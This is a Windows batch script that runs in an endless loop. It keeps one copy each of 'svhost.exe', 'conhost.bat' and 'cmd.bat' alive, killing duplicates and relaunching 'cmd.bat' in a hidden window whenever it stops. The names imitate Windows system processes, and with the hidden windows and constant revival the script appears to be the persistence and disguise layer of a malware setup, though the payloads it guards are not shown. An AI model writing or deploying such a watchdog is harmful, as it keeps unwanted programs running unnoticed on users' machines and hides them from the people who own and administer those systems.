@echo off
setlocal enabledelayedexpansion

:: Ensure the script runs from its own directory
cd /d "%~dp0"

:: Give all scripts a 5-second grace period to spin up on boot
timeout /t 5 /nobreak >nul

:loop
    :: ----------------------------------------------------
    :: 1. Check & Clean Duplicate Instances of svhost.exe
    :: ----------------------------------------------------
    set count=0
    for /f "tokens=2" %%a in ('tasklist /fi "imagename eq svhost.exe" /nh 2^>nul') do (
        set /a count+=1
        if !count! gtr 1 (
            taskkill /pid %%a /f >nul 2>&1
        )
    )

    :: ----------------------------------------------------
    :: 2. Check & Clean Duplicate Instances of conhost.bat
    :: ----------------------------------------------------
    set count=0
    for /f %%a in ('powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='cmd.exe'\" | Where-Object { $_.CommandLine -like '*conhost.bat*' } | Select-Object -ExpandProperty ProcessId" 2^>nul') do (
        set /a count+=1
        if !count! gtr 1 (
            taskkill /pid %%a /f >nul 2>&1
        )
    )

    :: ----------------------------------------------------
    :: 3. Robust Single-Instance & Auto-Revive for cmd.bat
    :: ----------------------------------------------------
    powershell -NoProfile -Command ^
        "$procs = @(Get-CimInstance Win32_Process -Filter \"Name='cmd.exe'\" | Where-Object { $_.CommandLine -like '*cmd.bat*' });" ^
        "if ($procs.Count -eq 0) {" ^
        "    Start-Process -FilePath '%~dp0cmd.bat' -WorkingDirectory '%~dp0' -WindowStyle Hidden;" ^
        "} elseif ($procs.Count -gt 1) {" ^
        "    $sorted = $procs | Sort-Object CreationDate;" ^
        "    for ($i = 0; $i -lt $sorted.Count - 1; $i++) {" ^
        "        Stop-Process -Id $sorted[$i].ProcessId -Force -ErrorAction SilentlyContinue;" ^
        "    }" ^
        "}"

    :: Wait for 3 seconds before checking again
    timeout /t 3 /nobreak >nul
goto loop